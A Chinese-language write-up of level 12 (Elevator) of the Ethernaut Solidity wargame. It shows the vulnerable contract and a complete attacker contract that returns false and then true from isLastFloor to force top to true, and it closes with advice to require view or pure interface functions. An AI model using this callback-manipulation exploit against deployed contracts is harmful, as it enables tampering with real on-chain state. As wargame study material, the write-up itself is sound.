---
title: Ethernaut 闯关笔记 第12关 Elevator
date: 2023-12-20 16:10:00
tags:
---

# 原始代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

# 攻击思路

进入 `if` 语句就代表着 `building.isLastFloor(_floor) == false` ，那么 `top` 似乎永远都无法为 `true` 。

实际上，我们可以随心所欲地实现 `Building` 合约。如何让一个合约一会儿返回 `false` ，过一会儿返回 `true` 呢？其实，每次调用的时候记录一下上一次的返回值，下一次返回时就返回相反的值即可。

# 攻击代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface Building {
    function isLastFloor(uint) external returns (bool);
}

contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (! building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}


contract ElevatorHack is Building{
    bool lastReturn = true;
    Elevator target;

    function isLastFloor(uint) external returns (bool) {
        if(lastReturn == true) {
            lastReturn = false;
            return false;
        }
        else {
            lastReturn = false;
            return true;
        }
    }

    function hack(address targetAddress) public {
        target = Elevator(targetAddress);
        target.goTo(114514);
    }
}
```

# 安全启示

涉及到接口的使用时，要考虑某些人可能会恶意实现接口，操纵接口合约的返回值进而操纵目标合约。

即使一个外部调用只返回了非常简单的信息，合约只是希望将这次外部调用的返回值作为判断条件或其他无关紧要的信息，而不想改变外部合约的状态，外部合约仍然有可能在这样的调用中改变自己的状态。

为了防止外部合约发生以外的状态改变，可以要求外部合约实现 `view` 函数或 `pure` 函数。